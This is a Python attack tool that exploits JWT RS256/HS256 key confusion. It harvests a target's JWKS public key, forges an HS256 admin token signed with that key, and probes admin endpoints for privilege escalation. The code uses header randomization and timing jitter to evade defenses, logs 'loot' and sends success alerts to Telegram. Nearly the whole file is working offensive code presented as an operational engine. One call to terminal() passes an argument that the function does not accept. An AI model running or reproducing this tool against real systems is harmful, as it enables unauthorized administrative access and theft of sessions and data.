#!/usr/bin/env python3
"""
JWT_KEY_CONFUSION.PY v8.8 — Cryptographic Key Confusion & RS256/HS256 Engine
"""
import asyncio
import base64
import hashlib
import hmac
import inspect
import json
import sys

from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.loot_logger import save_session_loot
from modules.telegram_notifier import send_telegram_alert
from modules.telemetry import stream_proof
from modules.transport import SecureTransport

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
}

HIGH_VALUE_KEYWORDS = [
    "critical",
    "bypass",
    "success",
    "loot",
    "token",
    "session",
    "admin",
    "credential",
    "compromised",
    "race",
    "pivot",
    "jwt",
    "dump",
    "hijack",
    "privilege",
]

SHELL_OR_CHALLENGE_MARKERS = (
    "<!doctype html>",
    "<html",
    '<div id="root"></div>',
    '<div id="__next"></div>',
    "<title>security check</title>",
    "cf-browser-verification",
    "just a moment...",
    "attention required!",
)

PRIVILEGE_RESPONSE_MARKERS = (
    '"role":"admin"',
    '"role": "admin"',
    '"role":"administrator"',
    '"role": "administrator"',
    '"permissions"',
    '"balance"',
    '"access_token"',
    '"user_id"',
)

_background_tasks: set[asyncio.Task] = set()


def terminal(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()


async def broadcast_tg_alert_async(loot_type, details):
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            await asyncio.wait_for(
                send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details),
                timeout=8,
            )
    except Exception:
        pass


def broadcast_tg_alert_sync(loot_type, details):
    """Non-blockingly fires Telegram alerts with zero-noise filtering."""
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            return

        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass


class JWTKeyConfusionEngine:
    def __init__(self, target_url):
        self.target_url = target_url
        self.transport = SecureTransport(target_url)

    def close(self):
        close_fn = getattr(self.transport, "close", None) or getattr(self.transport, "aclose", None)
        if callable(close_fn):
            try:
                res = close_fn()
                if inspect.isawaitable(res):
                    try:
                        loop = asyncio.get_running_loop()
                        if not loop.is_closed():
                            task = loop.create_task(res)
                            _background_tasks.add(task)
                            task.add_done_callback(_background_tasks.discard)
                        else:
                            res.close()
                    except RuntimeError:
                        asyncio.run(res)
            except Exception:
                pass

    def fetch_public_key(self, jwks_endpoint="/.well-known/jwks.json"):
        terminal(
            f"{COLORS['CYAN']}[*] Harvesting public keys from JWKS endpoint: {jwks_endpoint}{COLORS['RESET']}"
        )
        apply_behavioral_jitter()

        random_headers = get_randomized_hints()
        status, _, body = self.transport.request("GET", jwks_endpoint, extra_headers=random_headers)
        if status == 200 and isinstance(body, str) and body.strip():
            try:
                jwks = json.loads(body)
                if isinstance(jwks, dict) and ("keys" in jwks or "n" in jwks):
                    return body
            except Exception:
                if len(body.strip()) > 20 and "<html" not in body.lower():
                    return body
        return None

    def forge_hs256_token(self, payload_dict, public_key_str):
        header = {"alg": "HS256", "typ": "JWT"}
        enc_header = base64.urlsafe_b64encode(json.dumps(header).encode("utf-8")).rstrip(b"=").decode("utf-8")
        enc_payload = base64.urlsafe_b64encode(json.dumps(payload_dict).encode("utf-8")).rstrip(b"=").decode("utf-8")

        message = f"{enc_header}.{enc_payload}"
        signature = hmac.new(
            str(public_key_str).encode("utf-8"),
            message.encode("utf-8"),
            hashlib.sha256,
        ).digest()
        enc_sig = base64.urlsafe_b64encode(signature).rstrip(b"=").decode("utf-8")

        return f"{message}.{enc_sig}"

    def verify_and_exploit(self, verify_endpoint="/api/user/profile", public_key_str="", admin_payload=None):
        terminal(
            f"\n{COLORS['MAGENTA']}[***] EXECUTING JWT KEY CONFUSION CHECK [{verify_endpoint}] [***]{COLORS['RESET']}"
        )

        if not public_key_str:
            terminal(
                f"{COLORS['YELLOW']}[-] No public key harvested from target. Skipping key confusion check.{COLORS['RESET']}"
            )
            return False, ""

        if not admin_payload:
            admin_payload = {
                "sub": "admin",
                "role": "administrator",
                "isAdmin": True,
                "iat": 1700000000,
            }

        token = self.forge_hs256_token(admin_payload, public_key_str)

        apply_behavioral_jitter()
        headers = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/json, text/plain, */*",
        }
        headers.update(get_randomized_hints())

        status, resp_headers, body = self.transport.request("GET", verify_endpoint, extra_headers=headers)
        body_str = body if isinstance(body, str) else ""
        body_lower = body_str.lower()

        is_spa_shell = (
            any(marker in body_lower for marker in SHELL_OR_CHALLENGE_MARKERS)
            or len(body_str.strip()) < 100
        )

        has_privilege_indicators = any(marker in body_lower for marker in PRIVILEGE_RESPONSE_MARKERS)

        if status in (200, 201) and not is_spa_shell and has_privilege_indicators:
            terminal(
                f"{COLORS['RED']}{COLORS['BOLD']}[!] JWT KEY CONFUSION PRIVILEGE ESCALATION CONFIRMED [HTTP {status}]{COLORS['RESET']}"
            )
            terminal(f"  └── Response Excerpt: {body_str[:300]}", COLORS["GREEN"])

            loot_hash = hashlib.sha256(body_str.encode("utf-8", errors="ignore")).hexdigest()
            loot = {
                "token": token,
                "endpoint": verify_endpoint,
                "status": status,
                "integrity_hash": loot_hash,
                "response": body_str[:400],
            }

            stream_proof(
                "JWT_KEY_CONFUSION_SUCCESS",
                verify_endpoint,
                {"hash": loot_hash},
                "Admin token accepted via key confusion",
                loot,
            )
            save_session_loot(
                target=self.target_url,
                endpoint=verify_endpoint,
                finding_type="JWT_KEY_CONFUSION_BYPASS_VERIFIED",
                status=status,
                headers=resp_headers or {},
                body=body_str,
                extra_loot=loot,
            )
            broadcast_tg_alert_sync("JWT Key Confusion Exploit Success", loot)
            return True, token

        terminal(
            f"{COLORS['YELLOW']}[-] Endpoint returned HTTP {status} or rejected forged token.{COLORS['RESET']}"
        )
        return False, token


async def run_jwt_key_confusion(target_url, session_pool=None):
    """Compatibility wrapper for CognitiveOperator and orchestration engines."""
    engine = JWTKeyConfusionEngine(target_url)
    try:
        jwks_body = engine.fetch_public_key("/.well-known/jwks.json")
        if not jwks_body:
            jwks_body = engine.fetch_public_key("/api/jwks.json")

        verified, token = engine.verify_and_exploit("/api/admin/settings", jwks_body or "")
        if not verified:
            verified, token = engine.verify_and_exploit("/api/v1/user/profile", jwks_body or "")

        return {"vulnerable": verified, "forged_token": token}
    finally:
        engine.close()


async def run_jwt_confusion_engine(target_url):
    return await run_jwt_key_confusion(target_url)


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.invalid"
    asyncio.run(run_jwt_confusion_engine(target))
